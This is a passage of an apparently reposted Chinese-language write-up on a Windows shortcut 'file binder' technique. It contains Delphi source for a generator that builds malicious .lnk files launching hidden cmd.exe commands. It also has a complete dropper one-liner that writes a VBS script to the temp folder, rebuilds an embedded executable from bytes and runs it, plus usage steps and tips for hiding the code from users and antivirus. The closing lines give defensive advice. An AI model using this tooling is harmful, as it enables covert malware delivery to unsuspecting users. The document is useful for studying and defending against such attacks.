     SHORTCUT EXPLOIT           : FILE BINDER (WRAPPER)
     DISCOVERED AND CODED BY    : @DarkCoderSc
     https://twitter.com/DarkCoderSc
     Lead Developer / Security Researcher at Phrozen SAS (https://phrozensoft.com)
     PI:EMAIL
    *)
    program Shortcut_gen;
    {$APPTYPE CONSOLE}
    uses
      System.SysUtils, ActiveX, ShlObj, ComObj, Windows, Classes;
    function MaliciousLnk(cmd, destPath : String) : Boolean;
    var cObject   : IUnknown;
        shellLink : IShellLink;
        PFile     : IPersistFile;
    begin
      result := false;
      CoInitialize(nil);
      try
        cObject := CreateComObject(CLSID_ShellLink);
        shellLink := cObject as IShellLink;
        PFile := cObject as IPersistFile;
        cmd := '/C "' + cmd + '"';
        shellLink.SetDescription('@DarkCoderSc');
        shellLink.SetPath('cmd.exe');
        shellLink.SetArguments(PWideChar(cmd));
        shellLink.SetShowCmd(SW_SHOWMINNOACTIVE);
        shellLink.SetWorkingDirectory('%windir%system32');
        shellLink.SetIconLocation('shell32.dll', 1);
        result := PFile.Save(PWideChar(destPath), false) = S_OK;
      finally
        CoUninitialize();
      end;
    end;
    var Arg1, Arg2 : String;
        strList    : TStringList;
    begin
      try
        if ParamCount <> 2 then begin
          writeln('usage:');
          writeln('- Arg1 : Payload file, generated with the "gen_shortcut_code.py"');
          writeln('- Arg2 : Full path of destination shortcut');
          exit;
        end;
        Arg1 := ParamStr(1);
        Arg2 := ParamStr(2);
        if NOT FileExists(Arg1) then exit;
        // THIS IS JUST A LAZY WORKING EXAMPLE OF OPENNING TEXT FILES
        strList := TStringList.Create;
        strList.LoadFromFile(Arg1);
        MaliciousLnk(strList.Text, Arg2);
        strList.Free;
      finally
        writeln(#13#10 + 'Press enter to leave...');
        readln;
      end;
    end.
生成的payload示例（利用x86汇编语言编写的Hello World示例）
    del %temp%tmp.vbs & echo payload=array(77,90,128,0,1,0,0,0,4,0,16,0,255,255,0,0,64,1,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,10,36,0,0,0,0,0,0,0,0,80,69,0,0,76,1,2,0,133,214,90,88,0,0,0,0,0,0,0,0,224,0,15,1,11,1,1,71,0,2,0,0,0,2,0,0,0,0,0,0,0,16,0,0,0,16,0,0,0,32,0,0,0,0,64,0,0,16,0,0,0,2,0,0,1,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,48,0,0,0,2,0,0,9,63,0,0,2,0,0,0,0,16,0,0,0,16,0,0,0,0,1,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,176,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,42,0,0,0,0,16,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,105,100,97,116,97,0,0,176,0,0,0,0,32,0,0,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,106,0,255,21,104,32,64,0,80,232,12,0,0,0,72,101,108,108,111,32,87,111,114,108,100,0,106,0,255,21,152,32,64,0,106,0,255,21,100,32,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,32,0,0,0,0,0,0,0,0,0,0,60,32,0,0,100,32,0,0,144,32,0,0,0,0,0,0,0,0,0,0,74,32,0,0,152,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,75,69,82,78,69,76,51,50,46,68,76,76,0,0,85,83,69,82,51,50,46,68,76,76,0,0,0,0,112,32,0,0,126,32,0,0,0,0,0,0,112,32,0,0,126,32,0,0,0,0,0,0,0,0,69,120,105,116,80,114,111,99,101,115,115,0,0,0,71,101,116,67,111,109,109,97,110,100,76,105,110,101,65,0,160,32,0,0,0,0,0,0,160,32,0,0,0,0,0,0,0,0,77,101,115,115,97,103,101,66,111,120,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0) >> %temp%tmp.vbs & echo Set FSO = Wscript.CreateObject("Scripting.FileSystemObject") >> %temp%tmp.vbs & echo Set CTF = FSO.CreateTextFile("%temp%tmp.exe") >> %temp%tmp.vbs & echo for i = 0 to UBound(payload) >> %temp%tmp.vbs & echo buff = buff^&chr(payload(i)) >> %temp%tmp.vbs & echo next >> %temp%tmp.vbs & echo CTF.Write buff >> %temp%tmp.vbs & echo Dim objShell >> %temp%tmp.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> %temp%tmp.vbs & echo CTF.Close >> %temp%tmp.vbs & echo objShell.Run("%temp%tmp.exe") >> %temp%tmp.vbs & %temp%tmp.vbs
如果将它粘贴到您喜欢的命令提示符下，它会将一个VBS文件提取到临时文件夹中，如果运行此VBS文件的话，它将执行该嵌入式应用程序。
当你将这个payload注入一个快捷方式后，只需点击该快捷方式，它就会替你完成所有的工作！
**使用方法**
生成内联恶意VBS应用程序提取器
    py gen_inlinecode.py @APPLICATION_LOCATION @PAYLOAD_DESTINATION
然后生成快捷方式
    shortcut_gen.exe @PAYLOAD_LOCATION @SHORTCUT_DESTINATION
现在，将生成一个新的快捷方式，其中包含一个完整的应用程序。当双击该快捷方式时，它将提取出嵌入其中的应用程序，然后从临时文件夹执行该程序。
注意，如果打开快捷方式属性，则整个代码就不可用了，因为Microsoft通常只允许在参数字段中添加260个字节。这使得快捷方式更难以引起人们的警觉。
我们还可以修改脚本，使其在漏洞利用代码之前生成一个普通的垃圾“代码”，那么普通用户就会认为它是一个正常/安全的快捷方式。
**PoC视频**
快捷方式的最大尺寸约为64 KiB，这使得此漏洞可以兼容许多已知/未知病毒。
**结束语**
* * *
不要盲目相信你遇到的快捷方式。它们可能是用来隐藏恶意代码的，并且这些恶意软件通常是防病毒软件无法检测到的。如果随意打开的话，很可能就会中招！
您可以花些时间打开未知快捷方式的属性，看看它都是执行哪些命令。
如果您有任何疑问，请删除它！